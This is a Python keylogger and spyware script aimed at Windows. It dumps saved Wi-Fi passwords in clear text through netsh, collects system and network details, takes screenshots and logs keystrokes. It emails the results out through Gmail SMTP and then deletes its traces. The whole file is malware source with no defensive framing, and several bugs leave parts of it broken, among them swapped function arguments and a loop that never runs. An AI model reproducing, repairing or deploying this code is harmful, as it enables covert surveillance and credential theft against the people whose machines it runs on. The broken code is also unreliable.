#Libraries
import pynput
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import pyscreenshot as screenCapture
import socket
import os.path
import time
import subprocess
import PIL


count = 0
keys = []
keys_pressed = 0
email_user = ' '
email_send = ' '
email_password = ' '
subject = ' '
save_path = "C:\\Users\\Public\\Roaming\\"
system_information = os.path.join(save_path, "sysInfo.txt")
screenshot = os.path.join(save_path, "screenshot.png")
wifiInfo = os.path.join(save_path, "Wifi_Passswords.txt")
key_log = os.path.join(save_path, "log.txt")


def get_wifiInfo():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f = open(wifiInfo, "a")
            f.write("{:<10}: {:<}\n".format(i, results[0]))
            f.close()
        except IndexError:
            f = open(wifiInfo, "a")
            f.write("{:<10}: {:<}\n".format(i, ""))
            f.close()


def get_sysInfomation():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    ModelInfo = subprocess.check_output(["WMIC", "CSPRODUCT"]).decode('utf-8')
    WirelessInfo = subprocess.check_output(["ipconfig"]).decode('utf-8')

    f = open(system_information, "a")
    f.write("OS:" + platform.system())
    f.write(" " + platform.version() + "\n")
    f.write("Machine: " + platform.machine() + "\n")
    f.write("Hostname: " + hostname + "\n")
    f.write("IP Address:: " + IPAddr + "\n")
    f.write("Processor Information:" + platform.processor() + "\n")
    f.write("Manufacturer Information" + "\n" + ModelInfo())
    f.write(WirelessInfo())
    f.close()

def get_screenshot():
    img = screenCapture.grab()
    img.save(screenshot)

def sendEmail(filename, file):
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    date = subprocess.check_output(["date"]).decode('utf-8')
    msg['Subject'] = subject + date

    body = "View attached files."
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment).read()
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "Attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)
    server.sendmail(email_user, email_send, text)
    server.quit

def on_press(key):
    global keys, count
    keys.append(key)
    count+= 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        log_keys(keys)
        key = []

def log_keys(keys):
    with open(key_log, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    pass

get_wifiInfo()
sendEmail(wifiInfo, "wifiInfo.txt")

get_sysInfomation()
sendEmail(system_information, "system_informataion.txt")

get_screenshot()
sendEmail(screenshot, "screenshot.png")
os.remove(screenshot)

elapsed_time = time.time()
iterations = 0
iterations_end = 2 #1 hour

while iterations == iterations_end:


    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

    if time.time() - elapsed_time >= 1800:

        get_screenshot()
        sendEmail(screenshot, "screenshot.png")
        os.remove(screenshot)
        sendEmail(key_log, "log.txt")

        iterations = +1
        with open(key_log, "w") as f:
            f.write("Log part:{}\n\n".format(iterations + 1))

        elapsed_time = time.time()

os.remove(key_log)
os.remove(system_information)
os.remove(wifiInfo)

